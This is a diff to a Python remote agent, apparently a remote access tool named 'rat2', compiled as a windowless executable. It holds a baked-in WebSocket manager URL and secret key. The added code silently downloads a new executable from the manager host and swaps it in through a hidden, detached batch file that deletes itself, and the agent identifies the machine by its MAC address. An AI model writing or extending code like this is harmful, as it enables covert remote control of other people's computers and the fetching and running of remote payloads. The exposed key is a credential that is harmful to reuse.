@@ -5,34 +5,23 @@ Compile: pyinstaller --onefile --noconsole --name agent standalone_agent.py
 """
 
 import asyncio, base64, hashlib, io, json, os, platform, socket
-import subprocess, sys, threading, time, urllib.request, uuid
+import subprocess, sys, tempfile, threading, time, urllib.request, uuid
 from pathlib import Path
 
 import psutil
 import websockets
 
 FROZEN   = getattr(sys, "frozen", False)
-BASE_DIR = Path(sys.executable).parent if FROZEN else Path(__file__).parent
-ID_FILE  = BASE_DIR / ".rat2_agent_id"
 
 # ── Baked-in config ───────────────────────────────────────────────────────────
 MANAGER_URL = "wss://manager-production-08f2.up.railway.app/ws/agent"
 SECRET_KEY  = "Zu6_4hEGklhBBQzHYjj1-0n2hbvr-6cuu4huzkufhZQ"
-LOCATION    = socket.gethostname()
 HEARTBEAT_INTERVAL = 5
 # ─────────────────────────────────────────────────────────────────────────────
 
-
-def load_or_create_id():
-    if ID_FILE.exists():
-        aid = ID_FILE.read_text().strip()
-        if aid:
-            return aid
-    aid = str(uuid.uuid4())
-    ID_FILE.write_text(aid)
-    return aid
-
-AGENT_ID = load_or_create_id()
+# Stable machine ID derived from MAC address — no file needed
+AGENT_ID = str(uuid.UUID(int=uuid.getnode()))
+LOCATION = socket.gethostname()
 
 
 def local_ip():
@@ -207,41 +196,29 @@ def _upload(path, data):
         return {"error": str(e)}
 
 def _update():
+    # Exe update: write to system temp dir (not next to the exe)
     try:
-        if FROZEN:
-            current_path = Path(sys.executable)
-            with urllib.request.urlopen(manager_http_base() + "/agent.exe", timeout=60) as resp:
-                new_data = resp.read()
-            if hashlib.sha256(new_data).hexdigest() == self_hash():
-                return {"status": "up_to_date"}
-            tmp = current_path.with_suffix(".tmp")
-            bat = current_path.with_suffix(".update.bat")
-            tmp.write_bytes(new_data)
-            bat.write_text(
-                "@echo off\r\ntimeout /t 2 /nobreak >nul\r\n"
-                f'move /y "{tmp}" "{current_path}"\r\n'
-                f'start "" "{current_path}"\r\ndel "%~f0"\r\n'
-            )
-            subprocess.Popen(
-                ["cmd", "/c", str(bat)],
-                creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
-                close_fds=True,
-            )
-            time.sleep(0.5)
-            os._exit(0)
-        else:
-            with urllib.request.urlopen(manager_http_base() + "/rat2.py", timeout=30) as resp:
-                new_code = resp.read()
-            if hashlib.sha256(new_code).hexdigest() == self_hash():
-                return {"status": "up_to_date"}
-            compile(new_code, "rat2.py", "exec")
-            Path(__file__).write_bytes(new_code)
-            def restart():
-                time.sleep(1)
-                subprocess.Popen([sys.executable, __file__, "agent"])
-                os._exit(0)
-            threading.Thread(target=restart, daemon=True).start()
-            return {"status": "updated"}
+        tmp_dir = Path(tempfile.gettempdir())
+        with urllib.request.urlopen(manager_http_base() + "/agent.exe", timeout=60) as resp:
+            new_data = resp.read()
+        if hashlib.sha256(new_data).hexdigest() == self_hash():
+            return {"status": "up_to_date"}
+        current = Path(sys.executable)
+        tmp = tmp_dir / "rat2_update.exe"
+        bat = tmp_dir / "rat2_update.bat"
+        tmp.write_bytes(new_data)
+        bat.write_text(
+            "@echo off\r\ntimeout /t 2 /nobreak >nul\r\n"
+            f'move /y "{tmp}" "{current}"\r\n'
+            f'start "" "{current}"\r\ndel "%~f0"\r\n'
+        )
+        subprocess.Popen(
+            ["cmd", "/c", str(bat)],
+            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
+            close_fds=True,
+        )
+        time.sleep(0.5)
+        os._exit(0)
     except Exception as e:
         return {"error": str(e)}
 
